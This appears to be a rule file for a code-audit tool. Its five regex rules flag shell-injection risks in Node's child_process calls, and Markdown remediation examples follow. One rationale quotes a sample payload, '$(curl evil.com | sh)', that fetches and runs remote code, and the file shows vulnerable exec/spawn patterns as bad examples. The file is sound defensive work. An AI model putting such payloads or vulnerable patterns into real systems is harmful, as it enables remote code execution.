---
id: child-process-shell
version: 2
name: child_process shell-mode injection check
appliesTo: ['saas-web', 'api-service', 'cli-tool', 'library']
rules:
  - ruleId: spawn-shell-true-with-input
    label: spawn(...) with shell:true and template-literal command
    severity: P1
    mechanism: static-grep
    source: child-process-shell/v2
    rationale: spawn(cmd, args, { shell: true }) re-introduces shell parsing — defeating the whole point of using spawn over exec. With a template-literal command containing user input, every shell metacharacter (;, &&, |, $(), backticks) becomes an injection vector.
    detection:
      pattern: spawn\s*\(\s*`[^`]*\$\{[^`]*`[^)]*shell\s*:\s*true
      filePattern: src/**/*.{ts,tsx,js,jsx,mjs,cjs}
    fix:
      kind: template
      command: "echo 'manual remediation: drop shell:true. Pass cmd as a literal string and args as an array of pre-validated strings: spawn(\"git\", [\"clone\", url]).'"
      verifyCommand: "! grep -rE 'spawn\\s*\\(\\s*`[^`]*\\$\\{[^`]*`[^)]*shell\\s*:\\s*true' src/"
  - ruleId: exec-with-string-interpolation
    label: exec / execSync called with template-literal containing variables
    severity: P1
    mechanism: static-grep
    source: child-process-shell/v2
    rationale: exec runs the command through a shell, so any interpolated variable is parsed as shell syntax. Even seemingly safe values can contain $(curl evil.com | sh) if they originate downstream of user input. Use execFile with an args array instead.
    detection:
      pattern: \b(?:exec|execSync)\s*\(\s*`[^`]*\$\{
      filePattern: src/**/*.{ts,tsx,js,jsx,mjs,cjs}
    fix:
      kind: template
      command: "echo 'manual remediation: replace exec(`cmd ${x}`) with execFile(\"cmd\", [x]). The args array bypasses the shell entirely.'"
      verifyCommand: "! grep -rE '\\b(exec|execSync)\\s*\\(\\s*`[^`]*\\$\\{' src/"
  - ruleId: execSync-from-input
    label: execSync called directly on user input
    severity: P1
    mechanism: static-grep
    source: child-process-shell/v2
    rationale: execSync(req.body.cmd) is direct RCE — the request body becomes the shell command. There is no scenario where this is correct for an internet-facing service.
    detection:
      pattern: execSync\s*\(\s*(?:req|input|params|body|query)\b
      filePattern: src/**/*.{ts,tsx,js,jsx,mjs,cjs}
    fix:
      kind: template
      command: "echo 'manual remediation: there is no safe rewrite — remove the call. If the endpoint legitimately runs a command, replace with execFile and a fixed allow-list of commands.'"
      verifyCommand: "! grep -rE 'execSync\\s*\\(\\s*(req|input|params|body|query)\\b' src/"
  - ruleId: spawn-shell-cmd-windows
    label: spawn cmd.exe /c with user input
    severity: P2
    mechanism: static-grep
    source: child-process-shell/v2
    rationale: On Windows, spawn('cmd.exe', ['/c', input]) is the equivalent of exec on POSIX — the /c flag tells cmd to parse the rest as a command string. User input on the right side gets shell-parsed with cmd's escaping rules (different and arguably worse than sh).
    detection:
      pattern: spawn\s*\(\s*['"]cmd(?:\.exe)?['"]\s*,\s*\[\s*['"]\/c['"]
      filePattern: src/**/*.{ts,tsx,js,jsx,mjs,cjs}
    fix:
      kind: template
      command: "echo 'manual remediation: do not use cmd.exe /c with user input. Invoke the target executable directly: spawn(\"powershell.exe\", [\"-File\", scriptPath]) is no better — use spawn(\"executable.exe\", [arg1, arg2]).'"
      verifyCommand: "! grep -rE 'spawn\\s*\\(\\s*[\\\"'\\'']cmd(\\.exe)?[\\\"'\\'']\\s*,\\s*\\[\\s*[\\\"'\\'']/c[\\\"'\\'']' src/"
  - ruleId: fork-with-user-script
    label: child_process.fork called with user-controlled script path
    severity: P1
    mechanism: static-grep
    source: child-process-shell/v2
    rationale: fork(scriptPath) launches a new Node child running the file at scriptPath. With user input that's path-traversal-to-RCE: fork(req.body.script) lets the attacker execute any .js file on disk, including ones they uploaded via an unrelated endpoint.
    detection:
      pattern: \bfork\s*\(\s*(?:req|input|params|body|query)\b
      filePattern: src/**/*.{ts,tsx,js,jsx,mjs,cjs}
    fix:
      kind: template
      command: "echo 'manual remediation: fork only hardcoded script paths. If the user must pick a worker, allow-list a fixed set of script files in the workers directory.'"
      verifyCommand: "! grep -rE '\\bfork\\s*\\(\\s*(req|input|params|body|query)\\b' src/"
---

# child_process shell-mode injection check

Node's child_process module has two execution modes: shell-parsed (exec,
execSync, spawn with shell:true) and direct (execFile, spawn with default).
The shell modes are the injection surface — any user-controlled byte in
the command becomes shell syntax. Five reachable patterns:

1. **`spawn-shell-true-with-input`** — spawn(`...${x}...`, {shell:true}).
2. **`exec-with-string-interpolation`** — exec/execSync with template literals.
3. **`execSync-from-input`** — execSync(req.body.cmd) direct RCE.
4. **`spawn-shell-cmd-windows`** — Windows-specific cmd.exe /c pattern.
5. **`fork-with-user-script`** — fork(req.body.script) loads arbitrary JS file.

## Remediation

### Replace shell modes with execFile + args array

```js
// Bad — shell-parsed, injection risk
exec(`convert ${userFile} out.png`);

// Bad — same risk via spawn shell:true
spawn(`convert ${userFile} out.png`, { shell: true });

// Good — args array, no shell parsing
execFile('convert', [userFile, 'out.png']);
spawn('convert', [userFile, 'out.png']);
```

### Validate the values that reach the args array

```js
// Even with execFile, validate paths
if (!/^[a-zA-Z0-9_.-]+$/.test(userFile)) return res.status(400).end();
execFile('convert', [userFile, 'out.png']);
```

### fork — allow-list worker scripts

```js
const WORKERS = {
  resize: path.join(__dirname, 'workers/resize.js'),
  rotate: path.join(__dirname, 'workers/rotate.js'),
};
const script = WORKERS[req.body.kind];
if (!script) return res.status(400).end();
fork(script);
```

After fixes, re-run `zerou audit` and confirm zero findings remain.
